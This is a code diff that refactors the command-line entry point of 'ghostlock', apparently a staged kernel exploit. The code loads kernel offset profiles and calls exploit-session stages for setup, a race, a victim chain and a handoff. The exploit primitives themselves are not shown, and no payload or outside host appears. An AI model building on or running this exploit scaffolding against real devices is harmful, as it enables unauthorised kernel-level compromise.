@@ -10,81 +10,61 @@
  * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
  */
 
-#include "legacy_support/legacy_entrypoint_starter.h"
-#include "profile_entry.h"
-#include "session/exploit_stages.hpp"
+#include "legacy/legacy_entrypoint_starter.h"
+#include "profile/entry.h"
+#include "support/fatal_error.hpp"
+#include "route/exploit_procedure.hpp"
 
 #include <array>
+#include <memory>
+#include <string_view>
 
 using namespace ghostlock;
-using namespace ghostlock::profile;
-using namespace ghostlock::session;
+
 
 int main(int argc, char **argv) {
-    kernel_offsets decoded = {};
-    std::array<char, 256> release_buf{};
-    bool app_call = false;
-    const char *prebuilt_path = nullptr;
-    const char *dump_dir = nullptr;
-    for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--ghostlock-app-call") == 0) {
-            app_call = true;
-        } else if (strcmp(argv[i], "--load-prebuilt-profile") == 0 &&
-                   i + 1 < argc) {
-            prebuilt_path = argv[++i];
-        } else if (strcmp(argv[i], "--dump-kernel-log") == 0 && i + 1 < argc) {
-            dump_dir = argv[++i];
-        } else {
-            pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
-                     " [--dump-kernel-log <dir>]\n", argv[0]);
+    try {
+        profile::kernel_offsets decoded = {};
+        std::array<char, 256> release_buf{};
+
+        bool app_call = false;
+        const char *prebuilt_path = nullptr;
+        const char *dump_dir = nullptr;
+        for (int32_t i = 1; i < argc; i++) {
+            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
+                app_call = true;
+            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
+                prebuilt_path = argv[++i];
+            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
+                dump_dir = argv[++i];
+            } else {
+                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
+                " [--dump-kernel-log <dir>]\n", argv[0]);
+                return 1;
+            }
+        }
+        if (app_call && prebuilt_path) {
+            pr_error("choose one entrypoint\n");
             return 1;
         }
-    }
-    if (app_call && prebuilt_path) {
-        pr_error("choose one entrypoint\n");
+
+        int32_t loaded;
+        if (prebuilt_path != nullptr) {
+            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size());
+        } else if (app_call) {
+            loaded = profile_entry::read_glk1_stdin(&decoded, release_buf.data(), release_buf.size());
+        } else {
+            loaded = legacy::start_legacy_entrypoint(&decoded, release_buf.data(), release_buf.size());
+        }
+        if (loaded != 0) {
+            pr_error("cannot load profile\n");
+            throw FatalError{};
+        }
+
+        auto &session = session::g_exploit_session;
+        auto procedure = make_exploit_procedure(session, decoded.route_kind());
+        return procedure->run(decoded, dump_dir);
+    } catch (const FatalError &) {
         return 1;
     }
-
-    int loaded;
-    if (prebuilt_path != nullptr) {
-        loaded = profile_entry::read_glk1_file(
-            prebuilt_path, &decoded, release_buf.data(), release_buf.size());
-    } else if (app_call) {
-        loaded = profile_entry::read_glk1_stdin(
-            &decoded, release_buf.data(), release_buf.size());
-    } else {
-        loaded = legacy::start_legacy_entrypoint(
-            &decoded, release_buf.data(), release_buf.size());
-    }
-    if (loaded != 0) {
-        pr_error("cannot load profile\n");
-        return 1;
-    }
-
-    ExploitSession &session = g_exploit_session;
-    switch (stages::run_setup_stage(decoded, dump_dir)) {
-        case stages::StageResult::Failed:
-            return 1;
-        case stages::StageResult::Done:
-            return 0;
-        case stages::StageResult::Continue:
-            break;
-    }
-
-    switch (stages::run_w1_stage(session)) {
-        case stages::StageResult::Failed:
-            return 1;
-        case stages::StageResult::Done:
-            return 0;
-        case stages::StageResult::Continue:
-            break;
-    }
-
-    stages::VictimChain chain;
-    if (stages::run_w2_w3_chain(session, &chain) == stages::StageResult::Failed) {
-        return 1;
-    }
-    return stages::run_handoff_stage(session, chain) == stages::StageResult::Failed
-               ? 1
-               : 0;
 }
